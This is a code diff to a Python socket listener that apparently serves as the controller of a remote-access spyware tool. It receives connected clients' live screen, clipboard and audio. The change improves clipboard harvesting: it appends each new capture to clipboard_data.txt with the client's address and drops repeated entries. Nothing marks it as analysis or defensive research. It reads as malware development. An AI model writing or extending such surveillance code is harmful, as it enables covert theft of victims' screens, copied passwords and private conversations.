@@ -13,6 +13,8 @@ def listener(ip, port):
     HOST = ip
     PORT = port
 
+    last_clipboard = None
+
     print(f"[*] Waiting for connection on {HOST}:{PORT}...")
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((HOST, PORT))
@@ -69,10 +71,12 @@ def listener(ip, port):
                 cv2.imshow(f"{addr} -> Screen", frame)
 
             # Save clipboard content
-            if clipboard:
-                with open("clipboard_data.txt", "w") as clipboard_file:
-                    cb_text = f"Client: {addr}\nData: {clipboard}"
+            if clipboard and clipboard != last_clipboard:
+                with open("clipboard_data.txt", "a") as clipboard_file: 
+                    cb_text = f"Client: {addr}\nData: {clipboard}\n\n"
                     clipboard_file.write(cb_text)
+
+                last_clipboard = clipboard
 
             # Play audio live and buffer it for saving later
             if isinstance(audio_chunk, np.ndarray) and audio_chunk.size > 0:
